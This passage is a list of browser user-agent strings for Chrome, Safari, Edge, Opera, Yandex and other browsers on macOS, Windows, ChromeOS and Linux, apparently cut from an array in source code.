    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1081 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1145 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1146 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition std-1)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition Yx 05)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.0.2408 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.0.2410 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.114 Whale/3.17.145.12 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.24',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.28',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.35',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.42',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.56',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.149 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.158 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.124 YaBrowser/22.9.5.710 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.27',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.106',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.106 (Edition std-1)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.106 (Edition Yx GX)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.34',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.42',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.52',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.61',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.72',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition std-1)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition Yx 08)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition Yx GX)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.0.2419 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.0.2424 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.181 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.35',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.42',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.56',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Viewer/97.9.5538.39',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.18 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4539.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.43',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.55',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.39',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.106.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.107.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.107.0.0 Safari/537.36 Edg/99.107.1418.24',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko, Foregenix) Chrome/91.0.4472.77 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.143 YaBrowser/22.5.0.1816 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1096 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.77 (Edition Yx)',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 YaBrowser/19.10.3.281 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Core/1.94.175.400 QQBrowser/11.1.5155.400',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Core/1.94.186.400 QQBrowser/11.3.5195.400',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.168 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.56',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36 Puffin/9.0.1.982WD',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0',
    'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.52',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition Yx 05)',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh_CN) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0 baidubrowser/1.x Safari/534.7',
    'Mozilla/5.0 (X11; CrOS aarch64 14526.69.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.82 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 14989.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15054.114.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15117.111.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15117.112.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15117.86.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15117.87.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15183.38.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/67.0.3396.99 Chrome/67.0.3396.99 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36 OPR/89.0.4447.38',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1110 (beta) Yowser/2.5 Safari/537.36',
